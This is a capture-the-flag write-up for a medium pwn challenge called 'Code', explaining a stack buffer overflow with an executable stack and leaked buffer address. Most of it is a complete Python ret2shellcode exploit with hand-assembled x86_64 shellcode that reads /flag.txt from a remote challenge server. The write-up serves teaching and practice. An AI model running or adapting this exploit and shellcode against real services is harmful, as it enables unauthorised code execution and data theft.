# Code

## Overview
Writeup for **Code** from Override CTF 2026.

## Category
Binary Exploitation / Pwn

## Difficulty
Medium

## Description
The challenge provided a remote binary that leaked a memory address upon execution. The hint suggested that "input flows in, but where does it really go?" and mentioned "shaping data carefully" to make it behave like instructions. This pointed toward a stack buffer overflow allowing for shellcode injection.

## Initial Analysis
Running the binary revealed a memory address leak:
```text
0x7ffd61787d10
Enter command:
```
By analyzing the binary with `checksec` and `objdump`, I identified the following:
- **Vulnerability:** An unsafe `read()` call allowing 200 bytes into a 64-byte buffer.
- **ASLR Bypass:** The leaked address was the start of the stack buffer itself.
- **No NX bit:** The stack was executable, making **ret2shellcode** the primary attack vector.

## Tools Used
- `GDB` (with GEF/pwndbg)
- `checksec`
- `objdump`
- `Python 3` (Socket & Struct)

## Approach
1. **Calculate Offset:** Determine the exact number of bytes needed to reach the Return Pointer (RIP).
   - Buffer: 64 bytes
   - Saved RBP: 8 bytes
   - **Total Offset to RIP:** 72 bytes.
2. **Payload Design:**
   - **Shellcode:** A custom x86_64 shellcode to open, read, and write `/flag.txt`.
   - **Padding:** Fill the remaining space up to 72 bytes.
   - **Overwriting RIP:** Use the leaked buffer address to redirect execution back to the start of our input.

## Steps to Solve
```python
import socket
import struct
import re
import time

HOST = "34.93.2.73"
PORT = 10081

# Establish connection
s = socket.create_connection((HOST, PORT))

# 1. Receive and Parse Leak
data = b""
while b"Enter command:" not in data:
    data += s.recv(1024)

print("[*] Received Data:\n", data.decode(errors="ignore"))

# Regex to find the 0x... hex address
match = re.search(rb"0x[0-9a-fA-F]+", data)
if not match:
    print("[-] Failed to find memory leak.")
    exit()

leak = int(match.group(0), 16)
print(f"[+] Leaked Buffer Address: {hex(leak)}")

# 2. Custom Shellcode (x86_64)
# Logic: open("/flag.txt"), read(fd, rsp, 100), write(1, rsp, 100)
shellcode = bytes.fromhex(
    "4831c0"              # xor rax, rax
    "50"                  # push rax (null terminator)
    "48bb666c61672e747874" # mov rbx, 0x7478742e67616c66 ('/flag.txt')
    "53"                  # push rbx
    "4883ec01"            # sub rsp, 1
    "c604242f"            # mov byte [rsp], 0x2f ('/')
    "4889e7"              # mov rdi, rsp (filename pointer)
    "31f6"                # xor rsi, rsi (O_RDONLY)
    "b002"                # mov al, 2 (sys_open)
    "0f05"                # syscall
    "4889c7"              # mov rdi, rax (fd)
    "4889e6"              # mov rsi, rsp (buffer)
    "ba00010000"          # mov rdx, 256 (count)
    "31c0"                # xor rax, rax (sys_read)
    "0f05"                # syscall
    "89c2"                # mov edx, eax (bytes read)
    "bf01000000"          # mov edi, 1 (stdout)
    "31c0"                # xor rax, rax
    "b001"                # mov al, 1 (sys_write)
    "0f05"                # syscall
)

# 3. Construct Payload
offset = 72
payload = shellcode
payload += b"A" * (offset - len(shellcode)) # Padding
payload += struct.pack("<Q", leak)           # Overwrite RIP with leak

# 4. Fire Exploit
print("[*] Sending payload...")
s.sendall(payload)

time.sleep(0.5)

# 5. Capture Flag
flag = s.recv(4096).decode(errors="ignore")
print(f"\n[+] Flag: {flag}")
```

## Flag
`OVRD{r3t2sh3llc0d3_1nj3ct_3x3cut3_0wn_th3_pr0c355_9a7c2f1d}`

## What I Learned
- **Ret2Shellcode:** How to exploit stack execution when the NX bit is disabled.
- **ASLR Bypass:** The impact of leaking stack pointers in vulnerable applications.
- **Payload Reliability:** Why direct syscall shellcode is often more robust than spawning a shell in remote CTF environments.

## References
_N/A_
